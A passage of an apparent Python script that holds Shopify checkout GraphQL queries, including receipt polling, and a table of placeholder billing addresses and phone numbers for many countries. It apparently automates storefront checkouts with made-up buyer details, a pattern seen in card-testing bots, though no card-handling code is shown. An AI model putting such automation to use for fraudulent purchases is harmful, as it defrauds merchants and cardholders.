orderingIndex...CustomerCreditCardPaymentMethodFragment}... on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{... on DepositPercentage{percentage __typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}poNumber merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{... on FilledBuyerIdentityTerms{customer{... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}... on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{... on SMSMarketingConsent{value __typename}... on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{... on FilledDutyTerms{totalDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tax{... on FilledTaxTerms{totalTaxAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{... on TargetAllLines{__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tip{tipSuggestions{... on TipSuggestion{__typename percentage amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{... on FilledTipTerms{tipLines{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{... on LocalizationExtension{fields{... on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{... on Captcha{provider challenge sitekey token __typename}... on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{... on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{... on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename... on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{... on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}... on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}... on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}... on PaypalWalletContent{paypalBillingAddress:billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}... on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}... on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}... on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on OffsitePaymentMethod{paymentMethodIdentifier name __typename}... on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}... on ManualPaymentMethod{id name paymentMethodIdentifier __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}... on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}... on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{... on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{... on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}... on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}... on WaitingReceipt{id pollDelay __typename}... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}... on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}... on FailedReceipt{id processingError{... on InventoryClaimFailure{__typename}... on InventoryReservationFailure{__typename}... on OrderCreationFailure{paymentsHaveBeenReverted __typename}... on OrderCreationSchedulingFailure{__typename}... on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}... on DiscountUsageLimitExceededFailure{__typename}... on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{... on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{... on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{... on PurchaseOrderPaymentTerms{billingAddress{__typename... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}... on PaypalWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}... on ApplePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}data signature version __typename}... on GooglePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on PaypalBillingAgreementPaymentMethod{token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{... on PurchaseOrderBuyerIdentityTerms{contactMethod{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}... on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename... on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

# ============================================================
# Address data
# ============================================================
C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH", "EUR": "DE", "AUD": "AU", "NZD": "NZ", "SGD": "SG", "SEK": "SE", "NOK": "NO", "DKK": "DK", "MXN": "MX", "BRL": "BR"}

book = {
    "US": {"address1": "123 Main", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Friedrichstraße 10", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "030 1234567"},
    "FR": {"address1": "10 Rue de la Paix", "city": "Paris", "postalCode": "75002", "zoneCode": "IDF", "countryCode": "FR", "phone": "01 23 456789"},
    "IT": {"address1": "Via Roma 1", "city": "Rome", "postalCode": "00184", "zoneCode": "RM", "countryCode": "IT", "phone": "06 1234567"},
    "ES": {"address1": "Gran Vía 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "M", "countryCode": "ES", "phone": "91 1234567"},
    "NL": {"address1": "Damrak 1", "city": "Amsterdam", "postalCode": "1012", "zoneCode": "NH", "countryCode": "NL", "phone": "020 1234567"},
    "BE": {"address1": "Grand Place 1", "city": "Brussels", "postalCode": "1000", "zoneCode": "BRU", "countryCode": "BE", "phone": "02 1234567"},
    "SE": {"address1": "Sveavägen 1", "city": "Stockholm", "postalCode": "11120", "zoneCode": "AB", "countryCode": "SE", "phone": "08 1234567"},
    "NO": {"address1": "Karl Johans gate 1", "city": "Oslo", "postalCode": "0154", "zoneCode": "03", "countryCode": "NO", "phone": "22 123456"},
    "DK": {"address1": "Strøget 1", "city": "Copenhagen", "postalCode": "1160", "zoneCode": "84", "countryCode": "DK", "phone": "33 123456"},
    "FI": {"address1": "Aleksanterinkatu 1", "city": "Helsinki", "postalCode": "00100", "zoneCode": "18", "countryCode": "FI", "phone": "09 1234567"},
